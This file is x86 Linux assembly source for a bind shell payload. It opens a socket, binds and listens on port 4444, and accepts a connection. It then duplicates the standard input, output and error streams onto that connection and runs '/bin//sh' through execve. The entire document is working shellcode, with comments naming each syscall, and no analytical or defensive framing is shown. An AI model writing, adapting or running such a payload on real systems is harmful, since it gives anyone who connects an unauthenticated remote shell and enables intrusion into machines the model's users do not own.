
global _start

section .text

_start:

    ; Zeroing out first 4 registers to work with them.
    xor ebx, ebx
    mul ebx
    xor ecx, ecx

    ; syscall #1 = socket()
    mov ax, 0x167
    mov bl, 0x02
    mov cl, 0x01
    int 0x80
    mov edi, eax


    ; syscall #2 = bind()
    xor eax, eax
    mov ax, 0x169
    mov ebx, edi
    xor ecx, ecx
    push ecx
    push ecx
    push word 0x5C11 ; port number of 4444
    push word 0x02
    mov ecx, esp
    mov dl, 16
    int 0x80

    ; syscall #3 = listen()
    xor eax, eax
    mov ax, 0x16b
    mov ebx, edi
    xor ecx, ecx
    int 0x80

    ; syscall #4 = accept4()
    xor eax, eax
    mov ax, 0x16c
    mov ebx, edi
    xor ecx, ecx
    xor edx, edx
    xor esi, esi
    int 0x80
    xor edi, edi
    mov edi, eax

    ; syscall #5 = dup2()
    mov cl, 0x3

    loop_dup2:
    xor eax, eax
    mov al, 0x3f
    mov ebx, edi
    dec cl
    int 0x80

    jnz loop_dup2

    ; syscall #6 = execve()
    xor eax, eax
    push eax
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0x0b
    int 0x80

   